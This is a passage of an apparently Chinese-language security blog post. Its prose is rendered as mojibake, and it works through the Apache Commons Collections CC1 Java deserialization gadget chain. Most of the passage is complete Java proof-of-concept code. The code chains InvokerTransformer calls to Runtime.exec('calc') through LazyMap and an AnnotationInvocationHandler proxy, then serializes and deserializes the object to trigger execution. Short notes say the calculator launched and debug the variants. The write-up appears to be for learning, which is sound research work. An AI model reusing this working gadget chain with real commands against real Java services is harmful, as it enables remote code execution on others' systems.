</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫Ôºö</p>
<p><img src="/p/cc1/image-20240727012113328.png"
	width="1493"
	height="253"
	srcset="/p/cc1/image-20240727012113328_hu9007631861713936205.png 480w, /p/cc1/image-20240727012113328_hu8725103701307384568.png 1024w"
	loading="lazy"
	
		alt="image-20240727012113328"
	
	
		class="gallery-image" 
		data-flex-grow="590"
		data-flex-basis="1416px"
	
></p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h6 id="ÊÄùËÄÉ">ÊÄùËÄÉ
</h6><p>OKÔºåÁé∞Âú®Â∞±ÊòØËß£ÂÜ≥ÂâçÈù¢ÈÅóÁïôÁöÑÈóÆÈ¢ò„ÄÇ</p>
<p><strong>1.ËÆæÁΩÆ‰∏Ä‰∏™ÊñπÊ≥ïÂêçÁß∞ÂØπÂ∫îÁöÑÈîÆÁöÑÂÆûË∑µ</strong>Ôºå‰πüÂ∞±ÊòØÂä†‰∏Ä‰∏™<code>hashMap.put(&quot;entrySet&quot;,&quot;xxxx&quot;);</code>  „ÄÇÊúÄÂêéÁöÑÊµãËØï‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;entrySet&#34;</span><span class="p">,</span><span class="s">&#34;xxxx&#34;</span><span class="p">);</span><span class="c1">//here!!!!</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÁªàÂπ∂Ê≤°ÊúâÂºπÂá∫ËÆ°ÁÆóÊú∫ÔºåÊÉ≥Ê≥ïÊ≠£Á°Æ„ÄÇ</p>
<p>2,.<strong>ÂàõÂª∫‰ª£ÁêÜÂØπË±°Êó∂ÁöÑÊñπÊ≥ïÂèÇÊï∞ÈóÆÈ¢ò</strong>ÔºåÂú®Êàë‰ª¨ÊÉ≥Ë¶ÅÂà©Áî®ÁöÑLazyMapÈìæ‰∏≠ÔºåÂÖ∂ÂÆûÂè™Ë¶ÅÂà∞‰∫Ü<code>AnnotationInvocationHandler#invoke</code>‰∏≠ÔºåÊ≠£Á°ÆË∞ÉÁî®‰∫ÜgetÊñπÊ≥ïÔºåÈÇ£‰πàÂØπ‰∫éÂêéÁª≠ÁöÑÂ¶ÇÊ≠£Â∏∏‰ª£ÁêÜ‰∏≠ÁöÑ‰ºöÂéªÂà∞ÂßîÊâòÁ±ª‰∏Ä‰∏ãÈÉΩÊòØÊó†ÊÑè‰πâÁöÑÔºåËÄå‰∏îËøôÈáåÊú¨Ë∫´LazyMapÂ∞±ÂÆûÁé∞‰∫ÜMapÊé•Âè£ÔºåÊâÄ‰ª•Âú®ÂàõÂª∫‰ª£ÁêÜÂØπË±°ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ÂÉèÂâçÈù¢ÁöÑPOCÈÇ£Ê†∑ÊûÑÈÄ†Ôºå‰ΩÜÂÖ∂ÂÆû‰ΩøÁî®LazyMap‰πüÊòØÂèØ‰ª•ÁöÑÔºåÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
